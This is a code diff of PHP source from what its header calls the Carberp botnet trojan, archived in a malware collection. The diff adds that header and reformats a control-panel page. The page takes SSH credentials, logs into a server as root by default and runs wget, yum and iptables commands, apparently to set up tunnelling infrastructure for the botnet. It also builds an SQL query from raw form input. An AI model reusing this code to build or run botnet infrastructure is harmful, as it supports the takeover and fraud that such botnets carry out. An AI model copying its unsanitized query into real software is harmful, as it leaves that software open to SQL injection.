@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 set_time_limit(0);
@@ -6,8 +17,10 @@ ini_set('memory_limit', '256M');
 
 get_function('create_cfg');
 
-if(isset($_POST['submit'])){
-	if(!function_exists('ssh2_connect')){		$bad_form['ssh2'] = 'SSH2 Module not found!';
+if(isset($_POST['submit'])){
+
+	if(!function_exists('ssh2_connect')){
+		$bad_form['ssh2'] = 'SSH2 Module not found!';
 		$FORM_BAD = 1;
 	}
 
@@ -34,12 +47,15 @@ if(isset($_POST['submit'])){
 	if(empty($_POST['inip'])){
 		$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
 		$FORM_BAD = 1;
-	}else{		$inip = explode('.', $_POST['inip'], 4);
+	}else{
+		$inip = explode('.', $_POST['inip'], 4);
 		if(count($inip) == 4){
 			$inip[3] = 0;
             $_POST['inip'] = implode('.', $inip);
 
-			foreach($inip as $it){				if($it > 255){					$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
+			foreach($inip as $it){
+				if($it > 255){
+					$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
 					$FORM_BAD = 1;
 					break;
 				}
@@ -47,11 +63,13 @@ if(isset($_POST['submit'])){
 
 			if($FORM_BAD != 1){
 				$rinip = $mysqli->query('SELECT inip FROM bf_servers WHERE (inip = \''.$_POST['inip'].'\')');
-				if($rinip->inip == $_POST['inip']){					$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
+				if($rinip->inip == $_POST['inip']){
+					$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
 					$FORM_BAD = 1;
 				}
 			}
-		}else{			$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
+		}else{
+			$bad_form['inip'] = '"' . $lang['inip'] . '" ' . $lang['nbp'];
 			$FORM_BAD = 1;
 		}
 	}
@@ -61,12 +79,16 @@ if(isset($_POST['submit'])){
 
 		$S = new ssh();
 
-		if(!$S->connect($_POST['adress'], $_POST['user'], $_POST['pass'], $_POST['port'])){			$errors .= '<div class="t"><div class="t4" align="center">Не могу подключится</div></div>';
-		}else{			$out = $S->cmd('modprobe tun');
+		if(!$S->connect($_POST['adress'], $_POST['user'], $_POST['pass'], $_POST['port'])){
+			$errors .= '<div class="t"><div class="t4" align="center">Не могу подключится</div></div>';
+		}else{
+			$out = $S->cmd('modprobe tun');
 			if(!empty($out)){
 					$errors .= '<div class="t"><div class="t4" align="center">tun нету</div></div>';
-			}else{				$out = $S->cmd('cat /etc/redhat-release');
-				switch(true){					case preg_match('~^(CentOS release|CentOS Linux release) 5\.([0-9])~is', $out):
+			}else{
+				$out = $S->cmd('cat /etc/redhat-release');
+				switch(true){
+					case preg_match('~^(CentOS release|CentOS Linux release) 5\.([0-9])~is', $out):
 						$S->cmd('yum install wget iptables zip -y');
 						$S->cmd('wget http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-2.el5.rf.i386.rpm -O /tmp/rpmforge-release.rpm');
 						$S->cmd('wget http://download.fedoraproject.org/pub/epel/5/i386/epel-release-5-4.noarch.rpm -O /tmp/epel-release.rpm');
@@ -256,7 +278,8 @@ if(isset($_POST['submit'])){
                         $bit = trim($bit);
 
                         $S->cmd('yum install wget iptables zip -y');
-                    	switch($bit){                    		case 'i386':
+                    	switch($bit){
+                    		case 'i386':
                     		case 'i686':
 								echo $S->cmd('wget http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.2-1.el6.rf.i686.rpm -O /tmp/rpmforge-release.rpm');
 								echo $S->cmd('wget http://download.fedoraproject.org/pub/epel/6/i386/epel-release-6-5.noarch.rpm -O /tmp/epel-release.rpm');
@@ -485,7 +508,8 @@ if(isset($_POST['submit'])){
 		}
 	}
 	$smarty->assign("errors", $errors);
-}else{	if(!isset($_POST['port'])) $_POST['port'] = 22;
+}else{
+	if(!isset($_POST['port'])) $_POST['port'] = 22;
 	if(!isset($_POST['user'])) $_POST['user'] = 'root';
 
 	if(!isset($_POST['inip'])) $_POST['inip'] = '10.50.100.0';
